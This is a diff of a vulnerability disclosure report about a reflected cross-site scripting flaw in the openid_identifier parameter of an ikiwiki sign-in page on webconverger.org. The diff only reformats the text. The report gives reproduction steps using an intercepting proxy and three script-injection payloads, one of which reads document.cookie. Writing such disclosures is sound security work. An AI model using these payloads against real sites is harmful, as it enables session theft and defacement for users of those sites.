@@ -5,14 +5,16 @@ Vulnerable Links:
 webconverger.org/ikiwiki.cgi?action=verify&do=signin&openid_identifier=1
 
 How To Reproduce The Vulnerability :
+
 1. Go to this link : webconverger.org/ikiwiki.cgi?action=verify&do=signin&openid_identifier=1
 2. refresh the page and intercept the http request using "brup suite" then at parameter "openid_identifier=" put xss payload
 3. forward the request
 
 XSS Payload :
-1. "></script><script>prompt(909043)</script>
-2. "></script><script>prompt("XSS Alert...!!! : Hacked By Raghav Bisht")</script>
-3. "></script><script>prompt(document.cookie)</script>
+
+1. `"></script><script>prompt(909043)</script>`
+2. `"></script><script>prompt("XSS Alert...!!! : Hacked By Raghav Bisht")</script>`
+3. `"></script><script>prompt(document.cookie)</script>`
 
 NOTE : Proof of concept is attached.
 
